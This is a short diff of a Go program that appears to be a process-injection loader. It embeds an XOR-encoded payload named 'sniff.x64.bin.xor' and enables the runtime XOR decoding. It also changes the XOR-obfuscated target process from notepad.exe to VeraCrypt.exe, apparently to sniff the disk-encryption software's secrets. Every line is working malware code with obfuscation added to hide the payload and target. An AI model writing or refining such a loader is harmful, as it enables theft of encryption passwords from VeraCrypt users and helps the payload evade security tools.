@@ -80,12 +80,12 @@ func FindTargetProcessID(TargetName string) uint32 {
 	return RetVal
 }
 
-//go:embed sniff.x64.bin
+//go:embed sniff.x64.bin.xor
 var Payload []byte
 
 func main() {
 	xor_key := []byte{'0', '0', '0', '0', '0'}
-	// MyXor(&Payload, uint64(len(Payload)), &xor_key, uint64(len(xor_key)))
+	MyXor(&Payload, uint64(len(Payload)), &xor_key, uint64(len(xor_key)))
 
 	// TargetName := []byte{0x5e, 0x5f, 0x44, 0x55, 0x40, 0x51, 0x54, 0x1e, 0x55, 0x48, 0x55} // notepad.exe XORed
 	TargetName := []byte{0x66, 0x55, 0x42, 0x51, 0x73, 0x42, 0x49, 0x40, 0x44, 0x1e, 0x55, 0x48, 0x55} // VeraCrypt.exe XORed
